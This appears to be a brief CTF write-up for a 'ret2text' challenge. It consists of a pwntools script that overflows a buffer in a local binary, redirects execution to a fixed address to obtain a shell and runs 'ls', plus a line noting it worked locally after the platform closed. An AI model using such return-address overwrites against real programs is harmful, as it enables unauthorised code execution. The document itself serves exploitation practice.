## ret2txt

exp

```python
from pwn import *

local = 1
p = process('./ret2text')
p.sendline(b'*'*(10+8)+p64(0x40068B))
p.sendline(b'ls')
p.interactive()
```

平台关了，本地通了